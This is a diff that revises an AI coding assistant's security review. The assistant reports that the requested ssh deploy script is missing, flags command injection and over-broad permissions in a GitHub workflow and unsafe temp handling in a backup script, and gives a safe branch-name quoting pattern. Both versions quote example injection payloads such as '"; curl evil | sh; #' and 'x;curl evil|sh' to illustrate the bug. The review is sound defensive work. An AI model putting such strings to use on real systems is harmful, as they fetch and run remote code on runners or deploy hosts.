@@ -1,23 +1,39 @@
-I couldn't find the script you described. Nothing in this workspace runs `ssh` or puts a branch name into a command string, so I haven't reviewed it. Could you send me its path, or check whether it's been committed to this branch?
+I couldn't find the script you described. Nothing in this workspace builds an ssh command from a branch name, so I haven't reviewed it yet.
 
-**What's here instead:**
+I searched every tracked file for `ssh`, `scp`, `branch`, `REF_NAME` and `deploy`. The closest matches are two other files:
 
-- **`.github/workflows/deploy.yml`** is the closest thing to a deploy script. It doesn't use ssh or a branch name, but it has two serious problems before it goes anywhere near CI:
-  - **Line 14:** `run: echo "Title is ${{ github.event.pull_request.title }}"` pastes the PR title straight into the shell script before the shell runs it. Anyone who opens a PR can run commands on the runner with a title like `"; curl evil | sh; #`. This is the same kind of bug you're worried about with the branch name. To fix it, pass the title in through `env:` (`env: TITLE: ${{ github.event.pull_request.title }}`) and reference it in the script as `"${TITLE}"`.
-  - **Line 7:** `permissions: write-all` on a `pull_request` trigger gives the job's token every write permission. Lower it to `contents: read` unless a step really needs more.
-- **`scripts/backup.sh`** uses `scp`, not `ssh`, and none of its input comes from users. It still falls short of a basic standard:
-  - It has no `set -Eeuo pipefail`. If `tar` fails, `scp` still runs and the script still exits 0.
-  - The temp directory `/tmp/backup.$$` has a predictable name, so another user on the machine can set a symlink trap there. Use `mktemp -d` instead.
-  - It only cleans up on the last line, so a failure or signal leaves the backup data in `/tmp`. It needs a `trap … EXIT`.
-  - None of the expansions are quoted, and it uses backtick `date` instead of `$(…)`.
+- **`.github/workflows/deploy.yml`** is a deploy workflow, but all it does is `echo` the PR title. There's no ssh step and no branch name.
+- **`scripts/backup.sh`** is the only shell script here. It runs `scp`, but on fixed values, not a branch name.
 
-**When you send the deploy script, I'll check it against these points.** These are the usual safe patterns for a branch name in a remote ssh command:
+It may live on another branch or in another repo, or the CI config may still be uncommitted. If you paste it or give me the path, I'll review it.
 
-1. **Check the branch name at the start against an allowlist, and reject anything that fails.** For example, `[[ ${branch} =~ ^[A-Za-z0-9._/-]+$ && ${branch} != -* && ${branch} != *..* ]] || exit 2`. Don't try to clean up bad names. Git allows branch names that are dangerous in a shell, such as `` foo$(id) ``, ``foo`id` ``, and `foo;id`.
-2. **Remember that ssh puts all its arguments back into one string and the remote shell parses it again.** Using an array on your side doesn't protect you. Either:
-   - send a fixed script over stdin with `ssh host bash -s -- "${branch@Q}" < remote.sh`, or
-   - quote the value with `printf -v q '%q' "${branch}"` and run `ssh host "deploy ${q}"`.
-   
-   Neither replaces step 1.
-3. **Put `--` before positional arguments** and `--` after the host name (`ssh -- "${host}" …`), so a branch or host starting with `-` can't be read as an option.
-4. **In CI, take the branch from `env:` (for example `GITHUB_HEAD_REF`) rather than `${{ }}`**, for the same reason as the PR-title bug above.
+## What I'll be checking for
+
+Building the remote command as a string is the main risk. ssh joins its arguments and the remote shell parses the result again. A branch named something like `x;curl evil|sh` or `$(…)` would then run commands on the deploy host, and anyone who can push a branch or open a PR can choose that name. Quoting it locally doesn't help, because the quotes are gone before the remote shell parses it. The safe pattern is:
+
+```bash
+if [[ ! ${branch} =~ ^[A-Za-z0-9._/-]+$ || ${branch} == -* || ${branch} == *..* ]]; then
+  printf 'invalid branch name: %s\n' "${branch}" >&2
+  exit 2
+fi
+# Fixed remote script; the branch travels as a quoted positional argument.
+ssh -- "${host}" "bash -s -- $(printf '%q' "${branch}")" < deploy-remote.sh
+```
+
+The allowlist check is what actually protects you; `%q` is a second layer of defence. Better still, have the remote side take a commit SHA and check it against `^[0-9a-f]{40}$`.
+
+## Problems in the files that do exist
+
+**`.github/workflows/deploy.yml`**
+- **Line 14:** `${{ github.event.pull_request.title }}` is pasted into the shell script before it runs, so a PR title like `"; curl …|sh; "` executes on the runner. Pass it through `env: TITLE: ${{ … }}` and use `"$TITLE"`.
+- **Line 7:** `permissions: write-all` gives the token full write access. Set `contents: read` and add only what the job needs.
+
+**`scripts/backup.sh`**
+- **Line 1:** There's no `set -Eeuo pipefail`. If `tar` fails, `scp` still runs and uploads a partial or missing archive.
+- **Lines 7–8:** `/tmp/backup.$$` is a predictable path, so another local user can create it first or put a symlink there. Use `mktemp -d`, with an `EXIT`/`INT`/`TERM` trap installed beforehand.
+- **Line 13:** cleanup only happens if the script reaches the end. Any failure leaves the data archive sitting in `/tmp`.
+- **Lines 10–11:** none of the variables are quoted, and it uses backticks. Quote every variable and use `$(date +%F)`.
+- **Line 11:** the remote path in `scp` is parsed again on the remote side. That's harmless with today's constants but breaks as soon as the path contains data.
+- It runs from cron but doesn't set its own `PATH` or `umask`. With no `umask`, the archive can be created readable by other users.
+
+I only read these files; I don't have a shell here, so I haven't run `shellcheck`, `bash -n` or the script itself. Run those once the real deploy script turns up.
